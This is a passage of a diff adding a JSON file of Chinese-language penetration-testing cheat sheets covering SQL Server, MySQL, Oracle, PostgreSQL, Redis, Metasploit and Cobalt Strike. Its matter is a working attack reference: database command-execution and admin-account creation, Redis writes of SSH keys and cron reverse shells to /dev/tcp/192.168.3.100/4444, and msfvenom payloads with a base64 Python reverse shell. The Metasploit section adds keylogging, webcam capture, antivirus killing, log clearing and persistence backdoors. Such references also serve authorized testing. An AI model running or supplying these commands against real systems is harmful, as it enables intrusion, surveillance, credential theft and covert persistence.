xp_subdirs \"C:\\\\WINDOWS\\\\\"\n\n    写表读取本地文件\n\nCREATE TABLE temp (data varchar(2000));--+\nBULK INSERT dbo.temp FROM 'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config';--+\nselect * from dbo.temp;--+\n\n    查询sqlserver数据库如何批量查询每个表前10条内容\n\ndatabase=School\n\nDECLARE @table_name VARCHAR(MAX)\nDECLARE table_cursor CURSOR FOR\n    SELECT TABLE_NAME\n    FROM INFORMATION_SCHEMA.TABLES\n    WHERE TABLE_TYPE = 'BASE TABLE'\n        AND TABLE_CATALOG = 'database=School'\n\nOPEN table_cursor\nFETCH NEXT FROM table_cursor INTO @table_name\n\nWHILE @@FETCH_STATUS = 0\nBEGIN\n    DECLARE @sql_string VARCHAR(MAX)\n    SET @sql_string = 'SELECT TOP 1000 * FROM School.dbo.' + @table_name\n\n    EXECUTE(@sql_string)\n\n    FETCH NEXT FROM table_cursor INTO @table_name\nEND\n\nCLOSE table_cursor\nDEALLOCATE table_cursor\n\n    查询sqlserver数据库如何批量查询每个表前10条内容,并备份为csv文件，我们可以利用bcp\n\ndatabase=School\n==========================================================================================\n-T 表示使用 Trusted Connection。当使用 -T 参数时，bcp 将使用 Windows 身份验证来连接到 SQL Server。\n-S 指定要连接的 SQL Server 实例的名称。\n默认实例: MSSQLSERVER\n\nHOSTNAME=IIS85-CN\n实例名=SQLEXPRESS\nbcp \"SELECT name FROM School.sys.tables\" queryout C:\\backup\\tables.txt -c -t, -T -S IIS85-CN\nbcp \"SELECT name FROM School.sys.tables\" queryout C:\\backup\\tables.txt -c -t, -T -S IIS85-CN\\SQLEXPRESS\n\n==========================================================================================\nbcp \"SELECT name FROM School.sys.tables\" queryout C:\\backup\\tables.txt -c -t, -S localhost -U sa -P admin\n\n==========================================================================================\nFOR /F %i IN (C:\\backup\\tables.txt) DO (\n  bcp \"SELECT TOP 10 * FROM School.dbo.%i\" queryout C:\\backup\\%i.csv -c -t, -S localhost -U sa -P admin\n)\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Mysql",
+    "command": "显示版本: select version();\n\n显示字符集: select @@character_set_database;\n\n显示数据库: show databases;\n\n显示表名: show tables;\n\n显示字段: show columns from table_name;\n\n显示计算机名: select @@hostname;\n\n系统版本: select @@version_compile_os;\n\nmysql路径: select @@basedir;\n\n数据库路径: select @@datadir;\n\ndescribe describe table_name;\n\n显示root密码: select User,Password from mysql.user;\n\n导入文件: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C);\n\n导出文件: select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user;\n\n开启外连: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;\n\nmysql安装路径: show variables;   \n\n更新数据库: UPDATE `DX15`.`dx15_common_member` SET `uid` = '1' WHERE `dx15_common_member`.`uid` =40407;更新40407uid变成uid1\n\nmysql更改root密码: mysqladmin -u root password \"newpwd\";\n\n查询表: select concat(User,0x3a,Password) from mysql.user; \n\n获取数据库所有表: SHOW TABLES FROM `databases`;\n\n获取列前20行: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20;\n\n获取表行数: SELECT COUNT(*) AS CNT FROM `dede_admin`;\n\n\n    更新mysql root密码\n\nupdate user set authentication_string=PASSWORD('123456') where user='root';\nflush privileges;\n\n    sqlmap mysql udf 提权\n\nsqlmap -d \"mysql://root:123456@192.168.3.184:3306/mysql\" --os-shell --random-agent\n\n    查看数据库及操作系统的架构\n\nselect @@version_compile_os, @@version_compile_machine;\nshow variables like '%compile%';\n\n    查看secure_file_priv属性\n\nshow global variables like '%secure%';\nshow global variables like '%secure_file_priv%';\n\n    查看plugin目录\n\nselect @@plugin_dir ;\nshow variables like 'plugin%';\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Oracle",
+    "command": "\n    查询SID\n\nselect instance_name from v$instance\n\n    查询当前IP\n\nselect sys_context('userenv','ip_address') from dual\n\n    sqlplus远程连接\n\nsqlplus system/123456@192.168.3.100:1521/orcl\n\n    oracle 提权 有回显 需要sqlplus\n\n赋权\n\nbegin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '\u003c\u003cALL FILES\u003e\u003e', 'read,write,execute,delete' );end;\n/\n\n创建java代码\n\ncreate or replace and compile java source named exe_linux as\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\npublic class Test\n{\npublic static String list_cmd(String str){\n    Runtime runtime=Runtime.getRuntime();\n  StringBuffer enco = new StringBuffer();\n  enco.append(\"GBK\");\n  try{\n  Process proc =runtime.exec(str);\n  InputStream inp_suc=proc.getInputStream();\n  InputStream inp_err=proc.getErrorStream();\n  BufferedReader bfr_err = new BufferedReader(new InputStreamReader(inp_err,enco.toString()));\n  BufferedReader bfr_suc = new BufferedReader(new InputStreamReader(inp_suc,enco.toString()));\n    String strLine;\n      while( (strLine=(bfr_suc.readLine())) != null){\n     \n      System.out.println(strLine);\n          }\n  while( (strLine=(bfr_err.readLine())) != null){\n     \n    System.out.println(strLine);\n    }\n        proc.destroy();\n        inp_suc.close();\n        inp_err.close();\n    }catch (Exception e) {\n      System.out.println(\"EXECUTE IS ERROR!\");\n      System.out.println(e.getMessage());\n    }\n    return \"\";\n  }\n     \n  /* public static void main(String[] args){\n     \n      list_cmd(args[0]);\n    }\n    **/\n}\n\n/\n\ncreate or replace procedure p_exe_linux(str varchar2) as language java\nname 'Test.list_cmd(java.lang.String)';\n/\n\nSET SERVEROUTPUT ON\nexec dbms_java.set_output(1111111111111);\nEXEC P_EXE_LINUX('whoami');\n\n    oracle 提权 无回显 需要sqlplus\n\ncreate or replace and resolve java source named JAVACMD as\n    import java.lang.*;\n    import java.io.*;\n    public class JAVACMD\n    {\n       public static void execmd(String command) throws IOException\n       {\n               Runtime.getRuntime().exec(command);\n       }\n   }\n   /\n\ncreate or replace procedure MYJAVACMD(command in varchar) as language java\n    name 'JAVACMD.execmd(java.lang.String)';\n/\n\nEXEC MYJAVACMD('net user ASP.NET Admin12345 /add');\nEXEC MYJAVACMD('net localgroup administrators Admin12345 /add');\n\nhttps://loong716.top/posts/Oracle_Database_Security/\t渗透过程中Oracle数据库的利用\nhttps://www.helloworld.net/p/5623921467\t\t\t",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "PostgreSql",
+    "command": "\n    查找postgresql 所有数据库名字\n\nselect datname from pg_database;\n\n# 删除并创建用于保存系统命令执行结果的表 \nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\n \n# 命令执行测试，多试几条\nCOPY cmd_exec FROM PROGRAM 'id';\nCOPY cmd_exec FROM PROGRAM 'ifconfig';\n \n# 查看结果\nSELECT * FROM cmd_exec;\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Redis",
+    "command": "\n    Redis未授权写密钥\n\nssh-keygen\ncat .ssh/id_rsa.pub\n\nredis-cli -h 192.168.3.110 -a password\n指定目录\nconfig set dir /root/.ssh\n指定文件名\nconfig set dbfilename authorized_keys\n设置公钥内容\nset x \"\\n\\n\\n id_rsa.pub \\n\\n\\n\"\n保存\nsave\n\n    Redis未授权写反弹shell\n\nset x \"\\n* * * * * exec /bin/sh 0\u003c/dev/tcp/192.168.3.100/4444 1\u003e\u00260 2\u003e\u00260\\n\"\nset x \"\\n* * * * * bash -i \u003e\u0026 /dev/tcp/192.168.3.100/4444 0\u003e\u00261\\n\"\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nsave\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "MSF",
+    "command": "payload生成\nLinux：\n反向连接：\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f elf \u003e shell.elf\n正向连接：\nmsfvenom -p linux/x64/meterpreter/bind_tcp LHOST=\u003cTarget IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f elf \u003e shell.elf\n\nWindows：\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f exe \u003e shell.exe\n\nMac：\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f macho \u003e shell.macho\n\nPHP：\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f raw \u003e shell.php\ncat shell.php | pbcopy \u0026\u0026 echo '\u003c?php ' | tr -d '\\n' \u003e shell.php \u0026\u0026 pbpaste \u003e\u003e shell.php\n\nASP：\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f asp \u003e shell.asp\n\nJSP：\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f raw \u003e shell.jsp\n\nWAR：\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f war \u003e shell.war\n\n执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：php shell.php\n\nPython：\nmsfvenom -p cmd/unix/reverse_python LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f raw \u003e shell.py\n\nBash：\nmsfvenom -p cmd/unix/reverse_bash LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f raw \u003e shell.sh\n\nPerl：\nmsfvenom -p cmd/unix/reverse_perl LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f raw \u003e shell.pl\n\n执行方式：复制shell.py中的内容在linux命令行下执行：\npython -c \"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))\"\n\nshellcode Linux Based Shellcode：\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f \u003clanguage\u003e\n\nWindows Based Shellcode：\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f \u003clanguage\u003e\n\nMac Based Shellcode：\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=\u003cYour IP Address\u003e LPORT=\u003cYour Port to Connect On\u003e -f \u003clanguage\u003e\n\n基本系统命令：\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.81.160\nset ExitOnSession false\nexploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)\njobs  # 查看后台攻击任务 \nkill \u003cid\u003e  # 停止某后台攻击任务 \nsessions -l  # (查看会话)\nsessions -i 2   # 选择会话\nsessions -k 2   # 结束会话\n\n# 会话管理\nbackground  #将当前会话放置后台\nsessions  # 查看会话\nsessions -i  # 切换会话\nquit  # 关闭当前的会话，返回msf终端\n\n# 系统设置\nsysinfo  # 查看目标机系统信息\nidletime  # 查看目标机闲置时间\nreboot/shutdown   # 重启/关机\n\n# shell\nshell  # 获得控制台权限\nirb  # 进入ruby终端\n\n# 进程迁移\ngetpid    # 获取当前进程的pid\nps   # 查看当前活跃进程\nmigrate \u003cpid值\u003e    #将Meterpreter会话移植到指定pid值进程中\nkill \u003cpid值\u003e   #杀死进程\nmigrate \u003cpid值\u003e    #将Meterpreter会话移植到指定pid值进程中\n\n# 执行文件\nexecute #在目标机中执行文件\nexecute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互\n\n# 摄像头命令\nwebcam_list  #查看摄像头列表\nwebcam_chat  # 查看摄像头接口\nwebcam_snap   #通过摄像头拍照\nwebcam_stream   #通过摄像头开启视频\n\n# uictl开关键盘/鼠标\nuictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标\nuictl disable mouse  #禁用鼠标\nuictl disable keyboard  #禁用键盘\n\n# 远程桌面/截屏\nenumdesktops  #查看可用的桌面\ngetdesktop    #获取当前meterpreter 关联的桌面\nscreenshot  #截屏\nuse espia  #或者使用espia模块截屏  然后输入screengrab\nrun vnc  #使用vnc远程桌面连接\n\n# 键盘记录\nkeyscan_start  #开始键盘记录\nkeyscan_dump   #导出记录数据\nkeyscan_stop #结束键盘记录\n\n# 添加用户，开启远程桌面\n# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令\nrun post/windows/manage/enable_rdp  #开启远程桌面\nrun post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户\nrun post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662\n\n# 关闭防病毒软件\nrun killav\nrun post/windows/manage/killav\n\n# 修改注册表\nreg –h # 注册表命令帮助\nupload /usr/share/windows-binaries/nc.exe C:\\\\windows\\\\system32 #上传nc\nreg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run   #枚举run下的key\nreg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v lltest_nc -d 'C:\\windows\\system32\\nc.exe -Ldp 443 -e cmd.exe' #设置键值\nreg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v lltest_nc   #查看键值\nnc -v 192.168.81.162 443  #攻击者连接nc后门\n\n# 清理日志\nclearav  #清除windows中的应用程序日志、系统日志、安全日志\n\n文件系统命令：\ncat/ls/cd/rm  # 基本命令\nsearch -f *pass* -d C:\\\\windows # 搜索文件  -h查看帮助\ngetwd/pwd  # 获取当前目录\ngetlwd/lpwd   # 操作攻击者主机 查看当前目录\nupload /tmp/hack.txt C:\\\\lltest # 上传文件\ndownload c:\\\\lltest\\\\lltestpasswd.txt /tmp/  # 下载文件\nedit c:\\\\1.txt  # 编辑或创建文件  没有的话，会新建文件\nmkdir lltest2  # 只能在当前目录下创建文件夹\nrmdir lltest2  # 只能删除当前目录下文件夹\nlcd /tmp   # 操作攻击者主机 切换目录\n\n# timestomp伪造文件时间戳\ntimestomp C:// -h   #查看帮助\ntimestomp -v C://2.txt   #查看时间戳\ntimestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt\n\n网络命令：\n# 基本\nipconfig/ifconfig\nnetstat –ano\narp\ngetproxy   #查看代理信息\nroute   #查看路由\n\n# portfwd端口转发\nportfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口\nrdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码\n\n\n# 添加路由\n\n# 方式一autoroute （deprecated）\nrun autoroute –h #查看帮助\nrun autoroute -s 192.168.2.0/24  #添加到目标环境网络\nrun autoroute –p  #查看添加的路由\n\n# 方式二post/multi/manage/autoroute\nrun post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络\nrun post/multi/manage/autoroute CMD=print # 查看添加的路由\n(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))\n\n# 然后可以利用arp_scanner、portscan等进行存活检测\nrun arp_scanner -r 192.168.2.0/24\nrun post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24\nrun auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0\n\n# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理\n# msf提供了2个模块用来做socks代理。\n# auxiliary/server/socks_proxy\n# use auxiliary/server/socks_unc\n# 先background退出来，然后：\nuse auxiliary/server/socks_proxy\nset srvhost 127.0.0.1\nset srvport 1080\nrun\n\n# 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080\n# 最后proxychains 使用Socks5代理访问\n\n# sniffer抓包\nuse sniffer\nsniffer_interfaces   #查看网卡\nsniffer_start 2   #选择网卡 开始抓包\nsniffer_stats 2   #查看状态\nsniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包\nsniffer_stop 2   #停止抓包\n\n信息收集：\n# 信息收集的脚本位于：\n# modules/post/windows/gather\n# modules/post/linux/gather\n# 以下列举一些常用的\nrun post/windows/gather/checkvm #是否虚拟机\nrun post/linux/gather/checkvm #是否虚拟机\nrun post/windows/gather/forensics/enum_drives #查看分区\nrun post/windows/gather/enum_applications #获取安装软件信息\nrun post/windows/gather/dumplinks   #获取最近的文件操作\nrun post/windows/gather/enum_ie  #获取IE缓存\nrun post/windows/gather/enum_chrome   #获取Chrome缓存\nrun post/windows/gather/enum_patches  #补丁信息\nrun post/windows/gather/enum_domain  #查找定位域控\nrun post/windows/gather/enum_logged_on_users  #登录过的用户\n\n提权：\n1.getsystem  \n2. search bypassuac \n3.内核漏洞\n\n获取凭证：\n1.使用mimikatz\n2.run hashdump\n3.post/windows/gather/smart_hashdump\n\n假冒令牌：\n# 1.incognito假冒令牌\nuse incognito      #help incognito  查看帮助\nlist_tokens -u    #查看可用的token\nimpersonate_token 'NT AUTHORITY\\SYSTEM'  #假冒SYSTEM token\n或者impersonate_token NT\\ AUTHORITY\\\\SYSTEM #不加单引号 需使用\\\\\nexecute -f cmd.exe -i –t    # -t 使用假冒的token 执行\n或者直接shell\nrev2self   #返回原始token\n\n# 2.steal_token窃取令牌\nsteal_token \u003cpid值\u003e   #从指定进程中窃取token   先ps,找域控进程\ndrop_token  #删除窃取的token\n\n\n权限维持：\npersistence启动项后门：\nrun persistence –h  #查看帮助\nrun persistence -X -i 5 -p 4444 -r 192.168.81.160\n#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip\n# 示例\nmeterpreter \u003e run persistence -X -i 5 -p 4444 -r 192.168.81.160\n\nmetsvc服务后门：run metsvc –A\n\npersistence_exe：\nrun post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "CS",
+    "command": "BeaconCommands\n===============\n    Command                   Description\n    -------                   -----------\n    browserpivot              注入受害者浏览器进程\n    bypassuac                 绕过UAC\n    cancel                    取消正在进行的下载\n    cd                        切换目录\n    checkin                   强制让被控端回连一次\n    clear                     清除beacon内部的任务队列\n    connect                   Connect to a Beacon peerover TCP\n    covertvpn                 部署Covert VPN客户端\n    cp                        复制文件\n    dcsync                    从DC中提取密码哈希\n    desktop                   远程VNC\n    dllinject                 反射DLL注入进程\n    dllload                   使用LoadLibrary将DLL加载到进程中\n    download                  下载文件\n    downloads                 列出正在进行的文件下载\n    drives                    列出目标盘符\n    elevate                   尝试提权\n   execute                   在目标上执行程序(无输出)\n    execute-assembly          在目标上内存中执行本地.NET程序\n    exit                      退出beacon\n    getprivs                  Enable system privileges oncurrent token\n    getsystem                 尝试获取SYSTEM权限\n    getuid                    获取用户ID\n    hashdump                  转储密码哈希值\n    help                      帮助\n    inject                    在特定进程中生成会话\n    jobkill                   杀死一个后台任务\n    jobs                      列出后台任务\n    kerberos_ccache_use       从ccache文件中导入票据应用于此会话\n    kerberos_ticket_purge     清除当前会话的票据\n    kerberos_ticket_use       从ticket文件中导入票据应用于此会话\n    keylogger                 键盘记录\n    kill                      结束进程\n    link                      Connect to a Beacon peerover a named pipe\n    logonpasswords            使用mimikatz转储凭据和哈希值\n    ls                        列出文件\n    make_token                创建令牌以传递凭据\n    mimikatz                  运行mimikatz\n    mkdir                     创建一个目录\n    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)\n    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\n    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\n    mode http                 使用HTTP作为通信通道\n    mv                        移动文件\n    net                       net命令\n    note                      备注      \n    portscan                  进行端口扫描\n    powerpick                 通过Unmanaged PowerShell执行命令\n    powershell                通过powershell.exe执行命令\n    powershell-import         导入powershell脚本\n    ppid                      Set parent PID forspawned post-ex jobs\n    ps                        显示进程列表\n    psexec                    Use a service to spawn asession on a host\n    psexec_psh                Use PowerShell to spawn asession on a host\n    psinject                  在特定进程中执行PowerShell命令\n    pth                       使用Mimikatz进行传递哈希\n    pwd                       当前目录位置\n    reg                       Query the registry\n    rev2self                  恢复原始令牌\n    rm                        删除文件或文件夹\n    rportfwd                  端口转发\n    run                       在目标上执行程序(返回输出)\n    runas                     以另一个用户权限执行程序\n    runasadmin                在高权限下执行程序\n    runu                      Execute a program underanother PID\n    screenshot                屏幕截图\n    setenv                    设置环境变量\n    shell                     cmd执行命令\n    shinject                  将shellcode注入进程\n    shspawn                   生成进程并将shellcode注入其中\n    sleep                     设置睡眠延迟时间\n    socks                     启动SOCKS4代理\n    socks stop                停止SOCKS4\n    spawn                     Spawn a session\n    spawnas                   Spawn a session as anotheruser\n    spawnto                  Set executable tospawn processes into\n    spawnu                    Spawn a session underanother PID\n    ssh                       使用ssh连接远程主机\n    ssh-key                   使用密钥连接远程主机\n    steal_token               从进程中窃取令牌\n    timestomp                 将一个文件时间戳应用到另一个文件\n    unlink                    Disconnect from parentBeacon\n    upload                    上传文件\n    wdigest                   使用mimikatz转储明文凭据\n    winrm                     使用WinRM在主机上生成会话\n    wmi                       使用WMI在主机上生成会话\n    argue                     进程参数欺骗\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  }
+]
